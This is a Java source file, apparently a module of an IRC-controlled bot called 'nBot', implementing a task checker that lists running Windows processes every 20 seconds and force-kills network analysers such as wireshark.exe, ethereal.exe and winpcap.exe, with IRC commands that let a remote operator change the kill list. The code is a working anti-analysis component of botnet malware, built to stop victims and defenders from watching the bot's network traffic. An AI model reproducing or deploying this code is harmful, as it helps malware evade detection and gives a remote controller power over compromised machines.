
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class TaskChecker implements Runnable, Handler {

    public static ArrayList<String> badTasks = new ArrayList<String>();

    static {
        badTasks.add("wireshark.exe");
        badTasks.add("ethereal.exe");
        badTasks.add("winpcap.exe");
    }

    public void run() {
        while (Status.taskChecking) {
            try {
                try {
                    ArrayList<String> tasks = new ArrayList<String>();
                    Runtime runtime = Runtime.getRuntime();
                    String cmds[] = {"cmd", "/c", "tasklist"};
                    Process proc = runtime.exec(cmds);
                    InputStream inputstream = proc.getInputStream();
                    InputStreamReader inputstreamreader = new InputStreamReader(inputstream);
                    BufferedReader bufferedreader = new BufferedReader(inputstreamreader);
                    String line;
                    int lineNum = 0;
                    while ((line = bufferedreader.readLine()) != null) {
                        lineNum++;
                        if (lineNum <= 3) {
                            continue;
                        }
                        try {
                            String task = line.substring(0, line.indexOf(".exe") + 4);
                            tasks.add(task);
                        } catch (Exception e) {
                            e.printStackTrace();
                            continue;
                        }
                    }
                    for (String s : tasks) {
                        if (badTasks.contains(s.toString())) {
                            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", "taskkill", "/f", "/im", s});
                            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Bad process found and killed! (" + s + ")");
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    Status.taskChecking = false;
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + "" + " Could not continue process checking due to error: " + e.toString());
                }
                Thread.sleep(20000);
            } catch (InterruptedException ex) {
                Logger.getLogger(TaskChecker.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Process checking finished!");
    }

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";enabletaskchecking")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Task checking enabled!");
            Status.taskChecking = true;
            new Thread(this).start();
            return true;
        } else if (args[0].equals(";disabletaskchecking")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Disabling task checking!");
            new Thread(this).interrupt();
            Status.taskChecking = false;
            return true;
        } else if (args[0].equals(";addbadtask")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Adding bad task " + args[1]);
            badTasks.add(args[1]);
            return true;
        } else if (args[0].equals(";removebadtask")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Removing bad task " + args[1]);
            badTasks.remove(args[1]);
            return true;
        }
        return false;
    }
}
